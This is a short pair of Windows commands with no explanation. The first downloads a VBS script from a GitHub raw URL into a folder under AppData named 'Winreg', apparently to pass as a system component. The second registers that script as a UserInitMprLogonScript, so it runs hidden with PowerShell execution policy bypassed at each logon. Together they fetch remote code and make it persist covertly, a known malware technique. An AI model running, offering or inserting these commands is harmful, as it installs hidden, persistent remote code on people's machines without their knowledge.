powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/m4x7c/hfd/raw/refs/heads/main/siu.vbs', 'C:\Users\Ahsan\AppData\Roaming\Winreg\final.vbs')"
 
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Ahsan\AppData\Roaming\Winreg\final.vbs" /f
 